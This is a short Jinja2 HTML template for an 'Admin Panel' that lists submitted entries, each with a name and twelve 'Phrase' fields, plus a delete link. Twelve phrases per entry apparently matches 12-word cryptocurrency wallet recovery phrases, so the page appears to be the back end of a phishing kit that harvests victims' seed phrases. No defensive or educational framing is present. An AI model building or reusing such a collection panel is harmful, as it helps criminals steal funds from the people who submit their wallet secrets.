<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin Panel</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #121212; color: #fff; padding: 20px; }
        h1 { text-align: center; margin-bottom: 20px; }
        table { width: 100%; border-collapse: collapse; }
        th, td { border: 1px solid #333; padding: 10px; text-align: left; }
        th { background-color: #1e88e5; color: #fff; }
        a.delete { color: #ff5252; text-decoration: none; }
        a.delete:hover { text-decoration: underline; }
        td { word-break: break-word; }
    </style>
</head>
<body>
    <h1>Admin Panel</h1>
    <table>
        <tr>
            <th>Name</th>
            {% for i in range(1,13) %}
            <th>Phrase {{ i }}</th>
            {% endfor %}
            <th>Action</th>
        </tr>
        {% for idx, sub in enumerate(submissions) %}
        <tr>
            <td>{{ sub.name }}</td>
            {% for c in sub.codes %}
            <td>{{ c }}</td>
            {% endfor %}
            <td><a class="delete" href="/delete/{{ idx }}">Delete</a></td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
